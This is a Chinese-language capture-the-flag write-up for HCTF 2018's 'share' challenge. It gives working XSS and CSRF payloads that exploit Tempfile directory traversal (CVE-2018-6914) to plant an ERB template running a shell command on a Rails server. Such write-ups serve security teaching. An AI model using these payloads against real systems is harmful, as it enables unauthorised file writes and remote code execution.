 hctf2018_share_wp
===

# step1:
 从**http://share.2018.hctf.io/robots.txt**中获取到题目部分源码
 
```ruby
class FileController < ApplicationController
  before_action :authenticate_user!
  before_action :authenticate_role
  before_action :authenticate_admin
  protect_from_forgery :except => [:upload , :share_people_test]

# post /file/upload
  def upload
    if(params[:file][:myfile] != nil && params[:file][:myfile] != "")
      file = params[:file][:myfile]
      name = Base64.decode64(file.original_filename)
      ext = name.split('.')[-1]
      if ext == name || ext ==nil
        ext=""
      end
      share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+"/public/upload")
      share.write(Base64.decode64(file.read))
      share.close
      File.rename(share.path,share.path+"."+ext)
      tmp = Sharefile.new
      tmp.public = 0
      tmp.path = share.path
      tmp.name = name
      tmp.tempname= share.path.split('/')[-1]+"."+ext
      tmp.context = params[:file][:context]
      tmp.save
    end
    redirect_to root_path
  end

# post /file/Alpha_test
  def Alpha_test
    if(params[:fid] != "" && params[:uid] != "" && params[:fid] != nil && params[:uid] != nil)
      fid = params[:fid].to_i
      uid = params[:uid].to_i
      if(fid > 0 && uid > 0)
        if(Sharelist.find_by(sharefile_id: fid)==nil)
            share = Sharelist.new
            share.sharefile_id = fid
            share.user_id = uid
            share.save
        end
      end
    end
    redirect_to(root_path)
  end

  def share_file_to_all
    file = Sharefile.find(params[:fid])
    File.rename(file.path,Rails.root+"/public/download/"+file.name)
    file.public = true
    file.path = Rails.root+"/public/download/"+file.name
    file.save
  end

end
```


接着在代码中我们可以获取到
```ruby
  before_action :authenticate_user!
  before_action :authenticate_role
  before_action :authenticate_admin
  protect_from_forgery :except => [:upload , :share_people_test]
```

这个controller的所有function都需要admin权限，且`upload`和`share_people_tet`是没有csrf token认证的。

# step2:

在 **http://share.2018.hctf.io/home/share** 中存在一个提交表单，提交一段xss可以看到xss会被执行，但cookie开启了httponly。所以我们可以进行csrf upload来上传文件，之后再通过csrf获取上传后的文件名。

payload 如下：

```html
<!-- csrf upload payload -->
<script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://share.2018.hctf.io/file/upload", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarysWrrwCoy7FeMquna");
        xhr.withCredentials = "true";
        var body = "------WebKitFormBoundarysWrrwCoy7FeMquna\r\n" +
          "Content-Disposition: form-data; name=\"file[context]\"\r\n" +
          "\r\n" +
          "aaaa" +
          "\r\n" +
          "------WebKitFormBoundarysWrrwCoy7FeMquna\r\n" +
          "Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"Li4vLi4vYXBwL3ZpZXdzL2hvbWUvY3NyZi5lcmI=\"\r\n" +
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" +
          "PCU9IGBscyAuLi8uLi9gICU+\r\n" +
          "------WebKitFormBoundarysWrrwCoy7FeMquna\r\n" +
          "Content-Disposition: form-data; name=\"commit\"\r\n" +
          "\r\n" +
          "submit  \r\n" +
          "------WebKitFormBoundarysWrrwCoy7FeMquna--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
        submitRequest();
    </script>
```

```html
<!-- csrf post payload -->
<form action="http://share.2018.hctf.io/file/Alpha_test" id="test" method="POST">
        <input type="text" name="uid"><br>
        <input type="text" name="fid">
        
    </form>
</body>
<script>
    var f=document.getElementById("test");
    f.getElementsByTagName("input")[0].value="2";
    f.getElementsByTagName("input")[1].value="3";
    f.submit();
</script>
```


# step3:

hint 1和hint2分别给出了views的目录结构和index.html.erb中的一段局部渲染代码。
```
hint1:
views
|-- devise
| |-- confirmations
| |-- mailer
| |-- passwords
| |-- registrations
| | `-- new.html.erb
| |-- sessions
| | `-- new.html.erb
| |-- shared
| `-- unlocks
|-- file
|-- home
| |-- Alphatest.erb
| |-- addtest.erb
| |-- home.erb
| |-- index.html.erb
| |-- publiclist.erb
| |-- share.erb
| `-- upload.erb
|-- layouts
| |-- application.html.erb
| |-- mailer.html.erb
| `-- mailer.text.erb
`-- recommend
   `-- show.erb
hint2:
<%= render template: "home/"+params[:page] %>
```

从hint2可以明确(看到hint1其实可以猜测)的知道需要跨目录上传文件到**app/views/home**下，在ruby的官网也能看到
**CVE-2018-6914: Unintentional file and directory creation with directory traversal in tempfile and tmpdir** 且在upload中同样使用到了tempfile，尝试使用该漏洞进行跨目录上传恶意文件。

最后再csrf获取该文件名字，访问`http://share.2018.hctf.io/home/获得的filename`，done!

ps: 这一题出的时间比较赶，没有思考好场景怎么造比较好，所以这道题存在被偷鸡的方式，且中途由于bot没写好容易挂的原因给各位师傅造成不便，有点抱歉。最后谢谢做我题目的师傅，都是好人呐QAQ


